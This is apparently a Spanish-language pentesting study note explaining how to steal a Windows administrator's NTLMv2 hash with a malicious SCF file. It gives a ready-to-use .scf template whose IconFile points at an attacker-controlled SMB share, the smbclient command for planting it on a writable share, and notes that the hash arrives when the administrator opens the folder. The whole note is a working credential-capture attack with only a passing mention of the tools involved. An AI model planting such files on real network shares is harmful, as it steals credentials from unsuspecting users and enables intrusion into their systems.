Para esto tenemos que aprovecharnos de algún recurso que esté siendo hosteado por el administrador (revisar [[smbmap]])y que tengamos acceso, posteriormente, vamos a crear un archivo csf maliciosos, lo interesante de estos archivos es que se puede indicar la ruta por la cual se va a cargar el icono, obviamente podemos poner nuestra maquina como si fuera un recurso que está compartiendo ese icono, el archivo se veria algo así:

```Python
[Shell]
Command=2
IconFile=\\{NUESTRA_IP}\{NUESTRO_RECURSO}\file.ico

[Taskbar]
Command=ToggleDesktop
```

Antes de meter este archivo en el recurso que el Administrador está compartiendo, tenemos que iniciar un servidor SMB, revisar [[smbserver]].

Ahora podemos meternos al recurso (revisar [[smbclient]]) y pasar el arhcivo scf malicioso, para esto usaremos la siguiente sintaxis:

```python
put {nombre_del_archivo_scf}
```

Ahora solo tenemos que esperar a que el administrador se meta a la carpeta para que se intente cargar el archivo .ico a su nombre y al hacer la petición hacia nosotros podremos ver con el smbserver que nos llegó su hash NTLMv2.


